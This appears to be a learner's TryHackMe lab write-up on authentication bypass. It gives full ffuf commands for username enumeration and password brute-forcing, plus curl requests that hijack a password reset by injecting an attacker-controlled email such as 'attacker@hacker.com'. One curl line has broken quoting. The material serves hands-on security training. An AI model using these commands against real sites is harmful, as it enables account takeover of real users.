TRYHACKME

Authentication Bypass

Step 1.

1.  Start by going to the target website (In this case
    <http://10.201.79.189/customers/signup>).

2.  Try entering a username until you get the message “An account with
    this username already exists”. We use this information to produce a
    list of valid usernames already signed up on the system using the
    **ffuf** tool.

3.  Use the following command on the Linux terminal:

ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST
-d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type:
application/x-www-form-urlencoded" -u
http://10.201.79.189/customers/signup -mr "username already exists"

- **-w** (selects the file’s location on the computer that contains the
  list of usernames we are going to check exists.) -w
  **/usr/share/wordlists/SecLists/Usernames/Names/names.txt**

- **-X** (specifies the request method.) **-X POST**

- **-d** (specifies the data we are going to send (username, email,
  password, cpassword). The FUZZ keyword decides where the content from
  the wordlist will be inserted in the request. -**d
  "username=FUZZ&email=x&password=x&cpassword=x"**

- **-H** (Additional headers to the request. In this instance we are
  setting the content-type so that the web server knows we are sending
  form data. **-H "Content-Type: application/x-www-form-urlencoded"**

- **-u** (The URL we are making the request to). **-u
  http://10.201.79.189/customers/signup**

- **-mr** (Text on the page we are looking for to validate we've found a
  valid username). **-mr "username already exists"**

**<span class="mark">Using this command we find three additional valid
usernames; See screenshot below:</span>**

<img src="media/media/image1.png" style="width:6.5in;height:3.99028in"
alt="A screenshot of a computer AI-generated content may be incorrect." />

Step 2

1.  Use the following command in Linux terminal:

ffuf -w
valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2
-X POST -d "username=W1&password=W2" -H "Content-Type:
application/x-www-form-urlencoded" -u
[http://10.201.79.189/customers/login -fc
200](http://10.201.79.189/customers/login%20-fc%20200)

- **W1** (Since we now are using more than one wordlist we must specify
  our own FUZZ word. We use W1 here for valid usernames**. ffuf -w
  valid_usernames.txt:W1,**

- **W2** (We use W2 for the list of passwords we will try).
  **/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2**
  (w1 and w2 are separated with a comma).

- **-fc** (To check for a positive match we’re using the -fc argument to
  check for a HTTP status code other than 200). **-fc 200**.

**<span class="mark">Using this command, we find the password for the
username steve:</span>**

<img src="media/media/image2.png" style="width:6.5in;height:4.55278in"
alt="A screenshot of a computer AI-generated content may be incorrect." />

Step 3

2.  Type the following command in Linux terminal:

curl
'http://10.201.79.189/customers/reset?email=robert%40acmeitsupport.thm'
-H 'Content-Type: application/x-www-form-urlencoded' -d
'username=robert'

- **-H** (Setting the additional header to let the web server know we
  are using the Content-Type to application/x-www-form-urlencoded for
  sending form data. **-H 'Content-Type:
  application/x-www-form-urlencoded'**

> **<span class="mark">Using this command we get the following
> output:</span>**
>
> <img src="media/media/image3.png" style="width:6.5in;height:4.24375in"
> alt="A computer screen shot of a computer screen AI-generated content may be incorrect." />
>
> Step 4

1.  Use the following command in Linux terminal:

> Curl
> ‘http://10.201.79.189/customers/reset?email=Robert%40acmeitsupport.thm’
> -H ‘Content-Type: application/x-www/form-urlencoded/ -d
> ‘username=Robert&email=attacker@hacker.com’

2.  Use the following command in the Linux terminal:

curl
'http://10.201.79.189/customers/reset?email=robert%40acmeitsupport.thm'
-H 'Content-Type: application/x-www-form-urlencoded' -d
'username=robert&email=attacker@hacker.com'

3.  Create an account on the target website
    (<http://10.201.79.189/customers/reset>).

4.  Run the command from (2.) again but use your newly created account
    email in the email section: curl
    'http://10.201.79.189/customers/reset?email=robert@acmeitsupport.thm'
    -H 'Content-Type: application/x-www-form-urlencoded' -d
    'username=robert&email=**{new account**
    [**email}**@customer.acmeitsupport.thm](mailto:email%7d@customer.acmeitsupport.thm)'

5.  Login to the target machine with the credential for the new account
    you created. There should now be a support ticket in your inbox.
    It’s in the form of a reset link (in this case
    <http://10.201.79.189/customers/reset/11c0ee3c666531226637140f56a8d8d2>).

<span class="mark">This is the support ticket with the link to reset the
password:</span>

<img src="media/media/image4.png" style="width:6.5in;height:4.43958in"
alt="A screen shot of a computer AI-generated content may be incorrect." />
